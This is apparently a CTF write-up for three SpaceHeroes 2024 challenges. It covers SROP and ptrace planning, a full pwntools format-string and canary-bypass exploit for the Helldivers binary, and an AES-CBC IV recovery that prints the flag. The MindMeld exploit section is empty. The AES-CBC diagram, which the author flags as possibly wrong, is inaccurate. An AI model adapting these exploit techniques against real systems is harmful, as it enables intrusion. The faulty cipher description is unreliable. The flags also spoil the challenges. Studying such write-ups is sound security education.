---
title: SpaceHeroes 2024 Writeups
category: WRITEUP, CTF, SROP, PRINTF
date: May 15th, 2024
description: Writeup of challenges that i've completed for spaceheroes 2024 mainly being pwn challenges. 
---
 
## MindMeld
Looking at this binary we are given two binaries named spock and scotty.
When we connect to the service it seems we are interacting with the spock binary,
and are given the process id for scotty. 


### Mitigations
Now looking back at the spock binary we shoud look at what mitigations this binary
has using checksec. 

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

When putting it into static analysis we can see that there are seccomp rules added to this binary.
After running seccomp-tools on it. We can see that we are able to use a few syscalls. The
ones that we care about are open, read, write, and ptrace.

```
00401281      int64_t rax = seccomp_init(0)
004012a5      seccomp_rule_add(rax, 0x7fff0000, 0, 0)
004012c5      seccomp_rule_add(rax, 0x7fff0000, 1, 0)
004012e5      seccomp_rule_add(rax, 0x7fff0000, 2, 0)
00401305      seccomp_rule_add(rax, 0x7fff0000, 3, 0)
00401325      seccomp_rule_add(rax, 0x7fff0000, 5, 0)
00401345      seccomp_rule_add(rax, 0x7fff0000, 0xf, 0)
00401365      seccomp_rule_add(rax, 0x7fff0000, 0x3c, 0)
00401385      seccomp_rule_add(rax, 0x7fff0000, 0x65, 0)
004013a5      seccomp_rule_add(rax, 0x7fff0000, 0x101, 0)
004013c5      seccomp_rule_add(rax, 0x7fff0000, 0x106, 0)
004013d1      seccomp_load(rax)
004013e4      return seccomp_release(rax)
```

### Static Reversing

#### Spock
Looking through more reversing we can see that this is the main function that it getting called
and that it is a simple buffer overflow with 1337 bytes. When running ROPgadget there aren't any useful gadgets
that we can use to control any of the first three registers. This should be a simple buffer overflow but the
main problem is that we don't know where the flag is exactly.


```
0040161f      fflush(fp: stdout)
0040162e      fflush(fp: stdin)
0040164e      printf(format: "Scotty's mental frequency is: %d…", zx.q(print_pid()))
0040165d      puts(str: "My mind to your mind...")
00401671      printf(format: "Your thoughts to my thoughts >>>…")
00401680      fflush(fp: stdout)
0040169d      void buf
0040169d      return read(fd: 0, buf: &buf, nbytes: 0x539)
```


#### Scotty
Taking another look at the other binary we can see that essentially, it takes the first argument in 
when running the binary and stores it onto the heap. This is most likely either the flag or the 
path to the flag. We can also see that this heap address is stored in thought1 which is located 
at 0x404050. 

```
00401186  char* think_about(char* arg1)
0040119c      thought1 = malloc(bytes: 0x96)
004011ad      thought2 = malloc(bytes: 0x96)
004011be      thought3 = malloc(bytes: 0x96)
004011cf      thought4 = malloc(bytes: 0x96)
004011ec      strncpy(thought1, arg1, 0x96)
0040120a      strncpy(thought2, "A keyboard. How quaint.", 0x96)
00401228      strncpy(thought3, "Mad! Loony as an Arcturian dogbi…", 0x96)
0040124d      return strncpy(thought4, "I'll not take that, Mr. Spock! T…", 0x96)
```


One technique that is used when there aren't any ROPgadgets is SROP or Sigreturn Oriented Programming,
which utilizes the sigreturn syscall to get arbitrary code execution. The syscall is used to restore
state when switching back from kernel mode. It works in the same way that call and return store the 
base pointer and saved instruction pointer on the stack except it saves almost all of the registers. 


The requirements for SROP are very simple, you need at least 312 bytes of user controlled data on the stack 
(which is for our sigreturn frame), and you need to do a syscall with rax being set to 0xf. We can see 
by looking at the binary that there is a function that does a syscall sigreturn for us. 

```
00401219  int64_t sub_401219(uint64_t arg1)

00401219  6a0f               push    0xf {var_8}
0040121b  58                 pop     rax {var_8}  {0xf}
0040121c  0f05               syscall 
0040121e  c3                 retn     {__return_addr}
```

### Exploitation

Overall, we found that the scotty binary was ran with the flag as its first argument. There are two general
ways to solve this. The first being the intentional way is to use ptrace to read what is in the memory
in thought1 after getting an srop chain going. The second is that since we have the process id, and open, read,
write; we can read whats at `/proc/{pid}/cmdline` which prints what was used to execute that process.

#### Syscalls
Looking at the easier exploit the calls that we would want to make would be something like this.

```
1. open("/proc/{pid}/")
2. read(3, &stack\_addr, size)
3. write(stdout, &stack\_addr, size)
```

In the read call we can determine the fd based on how many files the program has opened. 
> By defualt every program opens the file descriptors 0-2 (0: stdin, 1: stdout, 2: stderr). 
Since don't have any file descriptors that are open, the file descriptor from our open call should be 3. 

> (In this case, we open pid.txt, but immediately close the file descriptor after being read.) 

For our exploit using ptrace we would write a chain with these functions. 

```
1. ptrace(PTRACE\_ATTACH, scotty\_pid)
2. ptrace(PTRACE\_PEEKDATA, scotty\_pid, &thought1)
3. write(1, &stack\_addr, 8)
4. ptrace(PTRACE\_PEEKDATA, scotty\_pid, &flag\_addr, &stack\_addr) # until we fully get flag
5. write(1, &stack\_addr, 0x30)
```


#### Setting up an SROP Chain
Now we have to setup the srop chain so that we can perform as many srop calls as we want. To
do this we have to create a fake stack. We first need to read to an empty place in memory. 

##### Finding writable memory
A general trick for finding a place in memory to write to is to look in gdb and look at the memory mapping. 
If we look for a section of memory that is writeable at the end of the binary, 
there will usuallybe an empty section that is writeable.

When the kernel maps memory pages for a process, each page much be in increments of 0x1000 bytes. 
However, most ELF binaries do not use all of the space that is allocated to it. So we can usually find
extra space within the binary to write to. 

We want to read all of our sigreturn frames on to this fake stack and then use that as our stack. I am 
going to add a little bit of space in the front for us to read and write data to. When setting our first
srop we want to set rsp and rbp to be our buffer. Each time we execute a new sigreturn frame, we also 
want to add the size of a sigframe to rsp. A general formula for setting this would look like this:

> `rsp = fake_stack_buffer + sizeof(sigreturn_frame) * index`


### Exploit





## Helldivers
For this binary, we are given a single binary and some other helper scripts that are used
for printing stuff to the screen. 


### Mitigations
Using the checksec tool we can see what mitigations that the binary has, from looking at the results
we can see that we have PIE, Full Relro, and NX. This means that we will have to get a leak for the
base of the binary, that we can't overwrite the GOT, and that we cannot execute shellcode on the stack.  

```
checksec helldivers
[*] '/home/solardebris/development/writeups/spaceheroes24/helldive/helldivers'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

When reversing the binary, we can see that there is a function similar to a canary that will 
run secure at the beginning of the function and validate at the end of a function mimicking 
a canary. 

### Static Reversing
The binary has a few main functions that are interesting being menu, deployObjective, 
secure, validate, and preamble. There is also a win function called superearthflag() which
opens and reads the flag.


#### Vulnerabilities
Looking at the vulnerabilities, we can see that we have a printf format vulnerability. We
can use this to leak different addresses. For this I am going to leak PIE, the stack, and the heap. 

We can also use a printf for writing, although i forgot about this so I did things a bit more 
complicated. There is also a gets that we can use to overwrite the return address. 


#### Custom Canary Implementation
The secure function takes in a pointer as an argument, creates a heap chunk and sets it to be the argument. 
It then also inserts the argument into a canary list into a mmapped chunk. 

```
00001390  int64_t* secure(int64_t arg1)

000013a1      int64_t* rax = malloc(bytes: 8)
000013b2      *rax = arg1
000013b5      int64_t var_10 = 0
000013bd      int32_t gsbase[0x2]
000013bd      uint64_t rax_2 = _readgsbase_u32(gsbase)
000013df      while (*(rax_2 + (var_10 << 3)) != 0)
000013e1          var_10 = var_10 + 1
000013fb      *(gsbase + (var_10 << 3)) = arg1
00001405      return rax
```
The validate function does the opposite and checks that the return pointer is equal to both the 
heap pointer and the element in the list above. It will then free the heap chunk and remove the 
pointer from the canary list.

```
000012d4  int64_t validate(int64_t arg1, int64_t* arg2)

000012e4      int64_t var_10 = 0
000012ec      int32_t gsbase[0x2]
000012ec      uint64_t r12 = _readgsbase_u32(gsbase)
00001315      while (*(r12 + ((var_10 + 1) << 3)) != 0)
00001317          var_10 = var_10 + 1
00001346      if (arg1 == *(r12 + (var_10 << 3)) && arg1 == *arg2)
0000135b          *(r12 + (var_10 << 3)) = 0
00001369          free(mem: arg2)
0000138f          return 0
0000137f      puts(str: "\-\-\ TREASON DETECTED /-/-/")
00001389      exit(status: 1)
00001389      noreturn
```

#### Overwriting the Canary
For overwriting the canary list we can look at the deployObjective function.
We can see through reversing that we can set one of the canaries in the canary 
list. 


```
0000187c  int64_t deployObjective()

00001888      int64_t* rax = secure(__return_addr)
00001894      int64_t buf = 0
000018a6      puts(str: "Aligning super destroyer...")
000018ab      int32_t gsbase[0x2]
000018ab      uint64_t r12 = _readgsbase_u32(gsbase)
000018bc      sleep(seconds: 1)
000018cb      puts(str: "Calculating mission integrity...")
000018de      uint64_t rax_5 = r12 ^ zx.q(supermangler)
000018ea      sleep(seconds: 1)
000018f9      puts(str: "Have you discussed aqcuiring the…")
0000190f      read(fd: 0, buf: &buf, nbytes: 8)
0000191f      uint64_t rax_8 = rax_5 ^ zx.q(buf.w)
00001930      puts(str: "Consulting Democracy Officer...")
0000193a      sleep(seconds: 1)
00001949      puts(str: "Verify mission credentials:")
0000195f      read(fd: 0, buf: &buf, nbytes: 8)
0000196c      *rax_8 = buf
00001974      sleep(seconds: 1)
00001983      puts(str: "Updating...")
0000198d      sleep(seconds: 1)
0000199c      puts(str: "Munitions platform updated.")
000019af      validate(__return_addr, rax)
000019b6      return 0
```


### Exploitation
For our exploit we'll overwrite the canary that returns from main and use the gets to overwrite both 
arguments to validate. Once we have control of both arguments to validate, we'll set the second
argument to be a reference to our win address which will be on the stack.

Our overflow will look something like this. 


>           second_arg                       saved_ret    fake_chunk             fake_next_size
> padding | p64(fake_chunk) | padding | ret_addr  |  ... |  0x21 | p64(win) ... | 0x21 


Below is the full exploit that leaks the stack and heap. Then overwrites the value on 
the canary list. Then finally overwrites the two arguments in validate() that gets called at 
the end of main.

```python
#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["st"]
)

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
        b *menu
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("helldivers.martiansonly.net", 6666)
    else:
        return process(binary)

def exploit(p,e,r):

    objective = b"\xe2\xac\x87 \xe2\xac\x86 \xe2\xac\x87 \xe2\xac\x86\x00"

    p.sendline(b"%22$p")
    p.recvuntil(b"Deploying stratagem:")
    p.recvline()
    stack_addr = int(p.recvline(),16) - 24
    log.info(f"Leaked stack address {hex(stack_addr)}")

    # Leak saved ret val from heap
    p.sendline(b"%21$p")
    p.recvuntil(b"Deploying stratagem:")
    p.recvline()
    heap_addr = int(p.recvline(),16)
    log.info(f"Leaked heap address {hex(heap_addr)}")


    # Get PIE base
    p.sendline(b"%29$p")
    p.recvuntil(b"Deploying stratagem:")
    p.recvline()
    pie_base = int(p.recvline().strip(),16) - 4700
    log.info(f"Leaked PIE Base {hex(pie_base)}")


    win = p64(e.sym["superearthflag"] + pie_base)

    p.recvuntil(b"Waiting on your call, helldiver >>>")
    p.sendline(objective)

    # Overwrite the canary saved for main+34
    xor_value = p64(0x1337)

    p.recvuntil(b"your Democracy Officer today?")
    p.send(xor_value)

    p.recvuntil(b"Verify mission credentials:")
    p.send(win)

    p.sendline("Quit")

    # Return value to main+34
    ret_val = p64(pie_base + 0x127e)

    # Return value for menu to main
    exp = cyclic(120) + p64(heap_addr) + p64(stack_addr+0x30) + ret_val
    exp += cyclic(32) + p64(stack_addr+0x108) + b"A" * 8 + win + b"B" * 184 + p64(0)  + p64(0x21) + win + cyclic(0x10) + p64(0x21)

    p.recvuntil(b"Waiting on your call, helldiver >>>")
    p.sendline(exp)

    p.interactive()


if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)
    exploit(p,e,r)
```


## This is Neat

This is a basic AES CBC challenge, AES is a symettrical cipher which means that the same key can be used to 
encrypt and decrypt. We're given the key and the 16 characters of the known plaintext, but we don't know the
iv. AES CBC requires an IV and a KEY, it encrypts and decrypts in blocks of 16 bytes which is important for this
challenge. We know that the key is b"3153153153153153" and that the message starts with "Mortimer_McMire:".
To get the key all we need to know now is the IV. 

Here is a simple flow graph of how AES CBC encrypts and decrypts (this might be wrong but is very simplified).

**Encryption**

> IV ^ KEY ->  AES\_ENCRYPT(KEY, PLAINTEXT) -> CIPHERTEXT

**Decrytpion**

> AES\_DECRYPT(CIPHERTEXT, KEY) -> RESULT ^ IV -> PLAINTEXT


Since AES CBC uses xor, we can encrypt our known plaintext with the key, but have an IV filled with 0s.
Then we can xor the ciphertext that we generated with the original ciphertext to get the iv that was used.

Now that we have the IV we can decrypt it and get the flag.


> python encrypt.py
> b'dC\xf8\x97\r\x97\xd5$\xc7\xaf_\xb9\x1epK\x91          shctf{th1s_was_ju5t_a_big_d1str4ction}'












